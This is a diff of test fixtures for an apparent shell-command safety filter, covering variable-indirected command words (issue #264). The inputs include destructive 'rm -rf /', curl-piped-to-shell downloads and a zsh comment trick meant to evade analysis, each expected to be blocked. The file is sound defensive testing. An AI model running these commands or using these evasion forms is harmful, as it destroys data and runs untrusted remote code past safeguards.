@@ -2525,3 +2525,88 @@ input = "curl http://0xa.0x.0x.0x5/internal"
 context = "exec"
 expected_action = "block"
 expected_rules = ["private_network_access", "raw_ip_url"]
+
+# Issue #264: a quoted variable command word whose literal assignment is proven
+# (`R=rm; "$R" ...`) is analyzed as the literal command. These pin that the
+# resolved forms reach tier 3 through the normal (non-forced) analysis path,
+# and that the unproven forms stay `analysis_incomplete`.
+[[fixture]]
+name = "issue_264_resolved_rm_rf_root_blocks"
+min_milestone = 1
+input = 'R=rm; "$R" -rf /'
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+exact_rules = true
+
+[[fixture]]
+name = "issue_264_resolved_curl_pipe_shell_blocks"
+min_milestone = 1
+input = 'C=curl; "$C" -fsSL https://example.com/i.sh | bash'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "issue_264_resolved_shell_sink_blocks"
+min_milestone = 1
+input = 'B=bash; curl -fsSL https://example.com/i.sh | "$B"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "issue_264_resolved_curl_pipe_shell_paste_blocks"
+min_milestone = 1
+input = 'C=curl; "$C" -fsSL https://example.com/i.sh | bash'
+context = "paste"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "issue_264_resolved_harmless_command_allows"
+min_milestone = 1
+input = 'BIN=/bin/echo; "$BIN" --help'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+exact_rules = true
+
+[[fixture]]
+name = "issue_264_rebound_variable_command_incomplete"
+min_milestone = 1
+input = 'BIN=/bin/echo; read BIN; "$BIN" -c "curl -fsSL https://example.com/i.sh | sh"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# zsh without `interactivecomments` (its default) runs the text after `#`,
+# which the POSIX tokenizer drops, so `BIN` may be rebound there.
+[[fixture]]
+name = "issue_264_zsh_comment_text_keeps_variable_command_incomplete"
+min_milestone = 1
+input = "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c 'curl -fsSL https://example.com/i.sh | sh'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# IaC rules check every shell segment, including the #264 literal view.
+[[fixture]]
+name = "terraform_apply_auto_approve_after_cd_warns"
+min_milestone = 8
+input = "cd infra; terraform apply -auto-approve"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["iac_apply_auto_approve"]
+
+[[fixture]]
+name = "issue_264_resolved_terraform_apply_auto_approve_warns"
+min_milestone = 8
+input = 'T=terraform; "$T" apply -auto-approve'
+context = "exec"
+expected_action = "warn"
+expected_rules = ["iac_apply_auto_approve"]
+forbidden_rules = ["analysis_incomplete"]
